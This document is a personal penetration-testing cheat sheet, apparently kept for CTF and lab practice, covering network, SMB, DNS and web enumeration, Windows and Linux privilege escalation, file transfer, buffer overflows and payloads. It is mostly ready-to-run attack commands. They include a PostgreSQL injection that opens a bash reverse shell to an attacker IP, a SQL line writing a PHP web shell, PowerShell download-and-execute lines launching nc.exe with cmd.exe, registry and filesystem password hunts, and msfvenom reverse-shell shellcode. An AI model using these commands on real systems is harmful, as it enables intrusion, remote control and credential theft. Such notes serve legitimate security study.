# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)
[a lot of good stuff](https://book.hacktricks.xyz/)
[Cheat sheets](https://pentestmonkey.net/)

# Check list
[] Process running
  - db
  - ?? ???
[] privileges
[] scripts

## Automatic web enum
- wpsscan -U user -P password
- [crackmapexec](https://www.crackmapexec.wiki/)

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
  - sudo nmap -p- -Pn -sS -sV -v --version-all $target -oA AllPort
  - sudo nmap -p -Pn -A $target -oA Services
  - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
    - -v Version
    - -A os, in-build scripts
    - -sC default scripts
    - -F: fast mode, fewer ports
  - SSL scan
    - --script ssl*

  - scripts
    - --script=nfs-ls,nfs-statfs,nfs-showmount
    - --script=smb-enum-shares.nse,smb-enum-users.nse

    - ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports

- smtp/pop 
  - enumerate
  - send email (file)
  - locate it

### DNS
- Port 53 UDP/TCP
  - -sU UDP
  - TCP: zone transfer
  - add entry to etc/hosts
    - echo "$target      domain" | sudo tee -a /etc/hosts
 - remove entry
  - sudo sed -i "/$target      domain/d" /etc/hosts
  
- dig $target +short
  - dig $target -t RECORD +short
  - dig axfr domain @ATTACKING
- host $target
  - host -t ns $target
  
#### Find domains
- dnsenum
- nmap
  -  nmap -T4 -p53 --script dns* $target
- fierce --domain domain
- dnsrecon -d DOMAIN -std
- wfuzz -c -w WORDLIST -u "http://$target/" -H "Host: FUZZ.$target" -f output.txt --hw (hide word/line/etc)

## Login
- brute force: hydra
- sqlmap

## Windows
- [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
- [Good Advices 2](https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842)
- [Windows enumeration](https://fuzzysecurity.com/tutorials/16.html?ref=172.16.77.130)
- whoami /priv
- systeminfo
  - architecture 
    - [Environment]::Is64BitProcess
    - [Environment]::Is32itProcess
- icalcs file = permission

- browser cache
  - procdump (process)
- RPC - 132
  - rpcclient
  - looksupsid.py
- Enumerate register
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%
  - PATH $Env:PATH
- Unquoted services:
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
- Permissions:
  - icalcs
- eventvwr
- RCE admin: change user
- Check files on user:
  -  cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata
  
- **Automatic scans**
  - winpeas
  - [privesc_check](https://github.com/pentestmonkey/windows-privesc-check)
  - [powerup](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
  - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  - [Peas Family](https://github.com/carlospolop/PEASS-ng/tree/master)
  - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
  - /usr/share/webshells 

### Kerberos
- Enumerate
  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name

### Registry
- Passwords:
  - REG QUERY HKLM /F "password" /t REG_SZ /S /K
  - REG QUERY HKCU /F "password" /t REG_SZ /S /K
  - REG QUERY HKLM /F "password" /t REG_SZ /S /d
  - REG QUERY HKCU /F "password" /t REG_SZ /S /d
  - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64

### SMB
- smbmap -H $target = Check Privileges 
- smbmap -H $target -R --depth 5
- smbclient -L //$target/ = List Shares
- smbclient -L //$target -U admin/administrator
- smbclient //$target/Users = Interactive shell to a share 
- smbclient  \\\\$target\\share$ = Open a Null Session
- smbclient //friendzone.htb/general -U "" = see files inside
- smbclient -N -L //$target/ = List Shares as Null User
- smbmap -u Administrator -p 'Password@1' -H $target
- smbclient -U 'administrator%Password@1' \\\\\$target\\c$
- Nmap scripts
  - smb-enum-users.nse
  - smb-os-discovery
  - smb-protocols
  - smb-enum-shares
  - smb-vuln*
- psexec.py user:pass@$target COMMAND

## Linux
- sudo -l
- history
- ps aux
- SUID
  - find / -perm -u=s -type f 2>/dev/null
  - find / -type f -perm -04000 -ls 2>/dev/null 
  - find / -type f -perm -4000 -user root -ls 2>/dev/null
  - find / -type f -perm -u=s -user root -ls 2>/dev/null
- Passwords:
  - grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
  - grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null
  - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;

- Virtual hosts?
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- Groups: LXD????
- crontab
- Write permisions?
- Automatic tools
  - LinEnum.sh 
  - LinPeas
  - psexec.py
  - pspy
  
- Shell stabilize
  - python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - python -c 'import pty; pty.spawn("/bin/bash")'
  - CTRL+Z
  - export TERM=xterm
  - stty raw -echo; fg
  - reset
  
- Automatic
  - linpeas

- export PATH=/tmp:$PATH = possible?

## Web
- POST: check source code
- dirb | dirsearch | gobuster | ffuz | wfuzz
  - wfuzz -c -u 'https:/target' -H "Host: FUZZ.target" -w WORDLIST--hh (hide/show)
  - gobuster -k (no tls validation) -w wordlist -x ext,ext,ext
- Input fields / parameter
  - c:/windows/win.ini
  - /etc/passwd
- cgi-bin = content
  - Apache!!!!
    - /etc/apache2/sites-available/000-default.conf
    - /var/www/html
    - ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
    - dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
- SQL endpoints
  - Find if crash
  - ORDER BY [Total_Columns]--
  - UNION SELECT c1,c2,c3...cn--
  - UNION SELECT c1,c2,@@version,...cn--
  - UNION SELECT c1,c2,@@version,...cn--
    - UNION SELECT c1,ce,(UNION SELECT column_flag FROM table_flag)--
  - parameters?
  - group_concat() = all values from != rows into one string
  - Where are files written? / DocumentRoot
    - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
  - locate webshells
  - Cheatsheets
    - [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    - [Pentestmonkey](https://pentestmonkey.net/category/cheat-sheet)
```
# Example PostgreSQl
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.107/1234 0>&1'''; --
```

## Upload files
### Windows
- powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
- powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
- certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
  - Append Command End of script
  - Invoke-Name_Script -Reverse -IP 123 -Port 123
- **SMB**
  - Attacker
    - impacket-smbserver share $(pwd) -smb2support
    - smbserver.py share .
    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
  - Victim
    - net use \\AttackingIP\share
    - net use x: \\IP\share /user:USER PASS = send to drive X:
    - copy file x:\
    - copy \\$attacker\share\file
    - copy \\IP\\share\file.ext 
- [Other methods](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)

- Impackt
  - /opt/impacket/
    - smb: psexec.py
    - MSQL
  - [More Info](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
  - [Other info](https://www.coresecurity.com/core-labs/open-source-tools/impacket)
  
### Linux
- python3 -m http.server 8000
- wget attacker-machine:8000:file.ext
- curl attacker-machine:8000:file.ext

# Buffer overflow
- Upload file on Immunity Debugger (windows)
  
```
# Define working folder
!mona config -set workingfolder c:\Users\admin\Desktop\patota

# Fuzzing
python3 -c 'print("A" * 5000)'
## Bytes
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08')"
## send paramenter of function
## disas function

# Generate payload after fuzzing
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL

# send created pattern through script
python script.py

# Find Offset with mona
!mona findmsp -distance TOTAL

# Finf offset with metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP
```

- Write BBBB on "retn"

```
while bad_chars
  !mona bytearray -b "\x00" = remove bad chars | !mona bytearray -cpb "\x00" = remove bad chars
  strings.py = without bad chars
  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin -a ESP-Address

!mona jmp -r esp -cpb "Badchars"
```

- Copy address and write it backwards
- Add padding: "\x90" * 16
- Shell code msfvenom without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
```

## Convert python
dos2unix file

## Pictures
- strings
- exiftool

## Payloads
- msfvenom - reverse -f aspx -o app.aspx
- -e x86/shikata_ga_nai
- windows/shell_reverse_tcp 